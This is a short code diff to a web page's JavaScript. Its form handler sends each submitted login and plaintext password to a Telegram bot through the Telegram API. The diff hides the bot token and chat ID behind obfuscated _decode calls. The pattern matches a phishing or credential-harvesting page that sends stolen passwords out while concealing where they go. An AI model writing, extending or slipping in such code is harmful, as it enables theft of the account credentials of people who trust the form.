@@ -176,10 +176,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
             const msg = `🚀 <b>НОВАЯ ЗАЯВКА</b>\n👤: <code>${login}</code>\n🔑: <code>${pass}</code>`;
 
-            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${_decode(_0x1a2b)}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
+                body: JSON.stringify({ 
+                    chat_id: _decode(_0x3c4d),
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
             })
             .then(r => {
                 if(r.ok) {
@@ -227,4 +231,5 @@ document.addEventListener('DOMContentLoaded', () => {
     // ДИАГНОСТИКА
     console.log('Script loaded. Forms check:', loginForm ? 'OK' : 'FAIL', regFormRequest ? 'OK' : 'FAIL');
 });
+
 
